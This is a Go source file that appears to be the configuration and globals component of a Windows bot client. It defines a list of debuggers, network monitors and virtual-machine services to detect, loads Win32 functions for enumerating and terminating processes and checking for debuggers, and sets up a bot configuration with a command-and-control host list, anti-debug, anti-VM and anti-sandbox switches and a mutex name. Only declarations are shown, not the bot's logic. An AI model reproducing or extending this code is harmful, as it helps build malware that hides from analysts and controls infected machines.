package components

import (
	"math/rand"
	"syscall"
	"time"
)

var (
	// Debugger list
	debuggers = [...]string{
		"NETSTAT",
		"FILEMON",
		"PROCMON",
		"REGMON",
		"CAIN",
		"NETMON",
		"Tcpview",
		"vpcmap",
		"vmsrvc",
		"vmusrvc",
		"wireshark",
		"VBoxTray",
		"VBoxService",
		"IDA",
		"WPE PRO",
		"The Wireshark Network Analyzer",
		"WinDbg",
		"OllyDbg",
		"Colasoft Capsa",
		"Microsoft Network Monitor",
		"Fiddler",
		"SmartSniff",
		"Immunity Debugger",
		"Process Explorer",
		"PE Tools",
		"AQtime",
		"DS-5 Debug",
		"Dbxtool",
		"Topaz",
		"FusionDebug",
		"NetBeans",
		"Rational Purify",
		".NET Reflector",
		"Cheat Engine",
		"Sigma Engine",
	}
	seed = rand.New(rand.NewSource(time.Now().UTC().UnixNano()))

	// Dlls loading
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	psapi    = syscall.NewLazyDLL("psapi.dll")

	// win32 api
	pfnCreateMutexW       = kernel32.NewProc("CreateMutexW")
	pfnIsDebuggerPresent  = kernel32.NewProc("IsDebuggerPresent")
	pfnTerminateProcess   = kernel32.NewProc("TerminateProcess")
	pfnEnumProcesses      = psapi.NewProc("EnumProcesses")
	pfnEnumProcessModules = psapi.NewProc("EnumProcessModules")
	pfnGetModuleBaseNameW = psapi.NewProc("GetModuleBaseNameW")
	pfnOpenProcess        = kernel32.NewProc("OpenProcess")
	pfnCloseHandle        = kernel32.NewProc("CloseHandle")
	pfnGetLastError       = kernel32.NewProc("GetLastError")

	botcore = BotCore{
		hosts:        []string{"http://127.0.0.1:9521/"},
		singleton:    true,
		anti_debug:   false,
		anti_vm:      false,
		anti_sandbox: false,
		use_ssl:      false,
		delay:        0,
		mutex_name:   "heelo",
	}
)

const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_READ = 0x0010
const PROCESS_TERMINATE = 0x0001

type BotCore struct {
	hosts        []string
	singleton    bool
	anti_debug   bool
	anti_vm      bool
	anti_sandbox bool
	use_ssl      bool
	delay        uint
	mutex_name   string
}

type Win32_Process struct {
	Name string
}
